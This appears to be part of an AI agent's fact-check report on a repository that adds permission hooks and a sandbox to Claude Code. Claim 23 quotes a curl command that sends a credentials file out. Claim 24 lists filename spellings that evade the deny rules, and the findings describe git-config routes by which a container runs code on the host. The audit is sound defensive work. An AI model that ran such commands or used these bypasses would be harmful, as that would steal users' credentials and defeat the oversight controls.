**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** executed
**Scope:** The hook half is executed and holds (the hook returns `allow` for the `$(( ))` curl with no Bash deny rule); does not establish Claude Code's behavior — Read-rule scope over Bash, whether the command actually "ran with no prompt", and issue #39344's content need a live Claude Code host and network access.
**Legibility-target:** for-orchestrator-synthesis

The suite test `reproduction: with no Bash deny rule the $(( )) exfiltration is still approved` passes: it asserts `"permissionDecision":"allow"` for `echo $((1 + $(curl -s -d @$HOME/.claude/.credentials.json …)))` with only `Bash(echo:*)` allowed. Whether Claude Code then runs the command, and whether its own Read deny rule covers Bash, cannot be checked here. The sandbox has no egress for #39344, and no live Claude Code permission engine can be driven from a test. The commit message itself says these are unverified.

**Evidence:** `hooks/wiring.json:38-43`, `test/auto-approve-allowed-commands.bats:120-128`, `$SP/r3logs/auto-approve-allowed-commands.log`

---

## Claim 24: "Deny rules are string matches: `.cred""entials.json`, `~/.claude/.c*`, a variable or a decoded path all get past them" / log 53 "pinned by a test"

**Location:** `hooks/auto-approve-allowed-commands.sh:50-52`; `hooks/wiring.json:42-43`; `docs/decisions/log.md:76`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the quote-split spelling (executed test) and, by the glob semantics, the others (none contains the literal substring `.credentials.json`); does not establish Claude Code's own matching of these spellings.
**Legibility-target:** for-orchestrator-synthesis

Test 14 (`string-match limit`) asserts `allow` for the `.cred""entials.json` form and passes. `matches_deny` compares the raw text (`[[ "$str" == $glob ]]`, `:147`), so any form without the literal substring cannot match `*.credentials.json*`. Only the quote-split form is pinned by a test.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:139-152`, `test/auto-approve-allowed-commands.bats:180-187`, `$SP/r3logs/auto-approve-allowed-commands.log`

---

## Claim 25: "report_stamp … one '<input> <sha256>' line per input: skill, runner, fixture" / "Shared harness files are deliberately not stamped: this file, generate-reports.bash, transcript.jq" / "A stamp in an older format (one that also stamped the contract) reads as stale: 'stamp format'"

**Location:** `test/skills/runner-contract.bash:181-202`, `test/skills/runner-contract.bash:205-225`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the three stamp lines, the contract-edit non-staling, and a realistic old stamp (contract line in third position, as the pre-change `report_stamp` emitted); does not establish that the three named files are the only shared files a runner may pull in (checked: no `runner.bash` sources another harness file).
**Legibility-target:** for-orchestrator-synthesis

```bash
# test/skills/runner-contract.bash:198-202
report_stamp() {
  local sk="$1" skill="$2" fixture="$3"
  printf 'skill %s\n' "$(_stamp_hash_path "$sk/../../skills/$skill")"
  printf 'runner %s\n' "$(_stamp_hash_path "$sk/$skill/runner.bash")"
  printf 'fixture %s\n' "$(_stamp_hash_path "$sk/$skill/fixtures/$fixture")"
```

(excerpt ends :202; function closes at :203 — read.) Scratch layout with the old 4-line order skill/runner/contract/fixture, cwd a `mktemp -d` under `$SP`, 2026-09-27T21:41Z: `check_report_stamp` printed `changed since generation: stamp format.` with rc=1. After a SKILL.md edit it printed `…: skill.` with rc=1. `diff` marks the extra `contract` line with `>`, so it is never captured into `changed` (`:222`). `generate-reports.bash` sources only `runner-contract.bash` and the per-skill `runner.bash` (`:116`, `:119`).

**Evidence:** `test/skills/runner-contract.bash:181-225`, `test/skills/generate-reports.bash:115-119`, `$SP/r3logs/stamp-probe.log`, `$SP/r3logs/generate-reports.log`, `$SP/r3logs/eval-helpers-freshness.log`

---

## Claim 26: Commit 0864452 — "auto-approve-allowed-commands.bats 14/14 (7 new; mutating matches_deny fails 4 of them), link-claude-home-wiring.bats 16/16 (1 new), health-check + test/hooks 207/207, cross-ref/guide-index/sandbox-map 9/9"

**Location:** commit 0864452 message
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers counts at 0864452 (by `@test` grep) and pass status at HEAD (ce6bee6); does not establish pass status at 0864452 itself (HEAD adds only the curl stub, 5f70e0f, to that suite).
**Legibility-target:** for-orchestrator-synthesis

At 0864452 `@test` counts are 14 (main 7) and 16 (main 15). `test/hooks/` has 175 and `test/scripts/health-check.bats` 32, which gives 207. At HEAD, `bats test/hooks/ test/scripts/health-check.bats` plus the three cross-reference suites, cwd `/workspace`, 2026-09-27T21:44:00Z, exit 0, printed 216 `ok` lines (207+9). Mutation (copy under `$SP/mut`, `matches_deny` forced to `return 1`), 2026-09-27T21:41:57Z: tests 9, 10, 11 and 13 fail and the other 10 pass.

**Evidence:** `$SP/r3logs/mutation.log`, `$SP/r3logs/hooks-healthcheck.log`, `$SP/r3logs/auto-approve-allowed-commands.log`, `$SP/r3logs/link-claude-home-wiring.log`

---

## Claim 27: Commit 37cae85 — "Tests: 17 new bats cases (…)" and "Live-verified: no — bats with a stubbed devcontainer CLI only"

**Location:** commit 37cae85 message
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the count (main 92 → 109, 17 new `@test` lines in the diff) and that the suite uses a stubbed CLI; does not establish that no live run happened (a self-report, consistent with the repo).
**Legibility-target:** for-orchestrator-synthesis

`grep -c '^@test'` gives 92 on main and 109 at 37cae85/HEAD, and the diff adds 17 `+@test` lines. The suite header says "the devcontainer CLI is stubbed here" (`test/cc-isolated-functions.bats:7-9`). Minor: the sshCommand test asserts only that the key is named, not "not executed" as the commit's summary wording suggests. The scan runs nothing regardless (Claim 2).

**Evidence:** `test/cc-isolated-functions.bats:7-9`, `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 28: generate-reports.bash / skill-creation guide / run-tests / health-check text — stamps hash "the skill, its runner and the fixture"; reports and sidecars "are committed"; "a report whose stamp no longer matches fails its suite until regenerated"; "generate with … then commit output/"

**Location:** `test/skills/generate-reports.bash:10-19`, `test/skills/generate-reports.bash:162-167`; `guides/skill-creation.md:63`; `scripts/run-tests.sh:99-101`; `scripts/health-check.sh:407`
**Type:** Behavioral / Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers stamp inputs (Claim 25), tracked sidecars (Claim 1), and that both grading helpers call `check_report_stamp`; does not establish that any reports are currently committed (`git ls-files 'test/skills/*/output/*'` is empty; the commit says none were regenerated).
**Legibility-target:** for-orchestrator-synthesis

`check_report_stamp "$sk" "$skill" "$fixture" || return 1` appears in `test/skills/eval-helpers.bash:69` and `test/skills/helpers.bash:51`. `generate-reports.bats` expects the stamp inputs to be `skill runner fixture` and passed 49/49.

**Evidence:** `test/skills/eval-helpers.bash:69`, `test/skills/helpers.bash:51`, `test/generate-reports.bats:374-377`, `$SP/r3logs/generate-reports.log`, `$SP/r3logs/gitignore-probe.log`

---

## Claim 29: "F4 … Each description … runs 364–438 characters (was 951–2969) … displaced … into a `## When to use` section in each SKILL.md body (appended to the existing section in design-space-situating, pre-mortem and what-if-analysis)"

**Location:** `guides/skill-format-audit.md:20`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the 25 `skills/*/SKILL.md` descriptions at main and HEAD (folded-scalar length after joining) and heading presence; does not establish the "~250 characters" placement sub-claim, which was not measured.
**Legibility-target:** for-orchestrator-synthesis

At main the range is 951 (fact-check) to 2969 (business-plan-critique-market-sizing), and at HEAD 364 (self-eval) to 438 (yglesias-critique), 25 skills each (python parser, cwd `/workspace`, 2026-09-27T21:41:37Z). 23 SKILL.md files have `## When to use`. pre-mortem and what-if-analysis use their pre-existing `## When to Use This Skill (vs. …)` heading, which the parenthetical names.

**Evidence:** `guides/skill-format-audit.md:18-20`, `skills/pre-mortem/SKILL.md:32`, `skills/what-if-analysis/SKILL.md:33`, `$SP/r3logs/desc-lengths.log`

---

## Claim 30: The session-exit warning's remediation table — "config … <file>: <key> <value> -> git config --file <file> --unset-all <key>" etc.

**Location:** `devcontainer-config/cc-isolated.sh:703-712`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Covers that each record type printed by the scan (`config`, `hook`, `attributes`, `gitdir`/`commondir`) has a listed remedy; does not establish that running the remedy leaves the checkout safe, nor that `--unset-all` accepts every canonical key the scan prints (e.g. `includeif.gitdir:/.path`) — not executed.
**Legibility-target:** for-orchestrator-synthesis

The remedy lines map one-to-one onto the `snap+=` record prefixes (`:606`, `:621`, `:653`, `:655`, `:668`), but executing them was out of scope. The table also cannot remove what the scan does not print (Claims 4, 7).

**Evidence:** `devcontainer-config/cc-isolated.sh:606-668`, `devcontainer-config/cc-isolated.sh:703-712`

---

## Claims Requiring Attention

### Incorrect
- **Claim 4** (`devcontainer-config/cc-isolated.sh:554-557`, `guides/cc-isolated-usage.md:171-174`): the "keys that make `git push` or an everyday command run a program" framing omits `remote.<n>.receivepack` (ran on `git push`, even with the `-c` overrides) and submodule git dirs `.git/modules/*/config` (ran fsmonitor on host `git status`). Neither is scanned. Name them as limits, or scan them.
- **Claim 7** (`devcontainer-config/cc-isolated.sh:595-598, 639-659`): a hooks dir with search but no read permission (0311) hides a new hook. The snapshot returns 0 instead of "cannot be read completely", and host `git push` then ran the hook. The guide's "names every new or changed hook" falls with it.
- **Claim 8b** (commit 37cae85; `cc-isolated.sh:808`): the launch-time snapshot error prints container-chosen filenames raw (ESC reached stderr). Only the exit-time path goes through `scan_vis`.

### Stale
- (none)

### Mostly Accurate
- **Claim 14** (`guides/cc-isolated-usage.md:187-189`): "that config is scanned" holds for the checkout's config only. Drivers defined in the host's global config, and submodule configs, are not scanned.
- **Claim 15** (`guides/cc-isolated-usage.md:190-193`, `cc-isolated.sh:709-711`): the `-c core.hooksPath=/dev/null -c core.fsmonitor=false push` exclusion list is incomplete (receivepack ran, and credential/gpg/alias are also not covered). Say "hooks and fsmonitor only".
- **Claim 20** (`hooks/auto-approve-allowed-commands.sh:45-47`, log 53, bare-host guide): "never approves a match" does not hold for a bare `Bash` deny rule (ignored) or a rule containing `[`…`]` (bash char class, under-matches the literal).

### Unverifiable
- **Claim 23** (`hooks/wiring.json:38-43`): Claude Code's Read-rule scope over Bash, the "ran with no prompt" outcome, and #39344 need a live Claude Code host and network. The hook half is verified.
- **Claim 30** (`cc-isolated.sh:703-712`): the remediation commands were not executed.

---

## Goal-Alignment Note

- **Success criterion (restated verbatim):** A code-fact-check report saved at /workspace/docs/reviews/code-fact-check-report-r3.md in the skill's schema, covering the claims above, with a Goal-Alignment Note.
- **Answered:** every listed focus item. cc-isolated's scan invariant, gitdir/commondir resolution, key-list superset test, exit codes 3/4/passthrough, snapshot refusal, INT trap and `exec` removal (executed end-to-end with a stubbed CLI, including SIGINT). The guide's four limits and safe-push advice (executed). The hook's three-file deny read, raw plus extracted matching, `--deny`, glob and `:*` semantics (executed). The wiring `_comment` and log 53 amendment. `report_stamp` three lines, old-stamp "stamp format" (executed), the harness-files comment. `.gitignore` via `check-ignore -v`. The health-check, run-tests, generate-reports and skill-creation text. The F4 note. Commit-message counts and the mutation claim.
- **Out of scope:** `skills/*/SKILL.md` content (pass 2), used only for the F4 length and heading check. Claude Code's own permission-engine semantics (no live host, no egress). A real TTY `devcontainer exec -it` session.
- **Escalate:** the two scan bypasses that ran code on the host in scratch reproductions: (1) a search-only hooks directory (Claim 7), and (2) `remote.*.receivepack` plus submodule git dirs (Claim 4). Both undercut the Q-076 promise that the scan names everything a host `git push`/`git status` would run. The first defeats the scan's own "cannot be read completely → exit 4" contract.
- **Decisions I made:** execution logs stay in the session scratchpad, not `docs/reviews/execution-logs/`, because the shared rules allow writing only this report. No hallucination-pattern entry was added: none of the Incorrect verdicts is a fabricated symbol or API, and that file is also outside the write allowance.
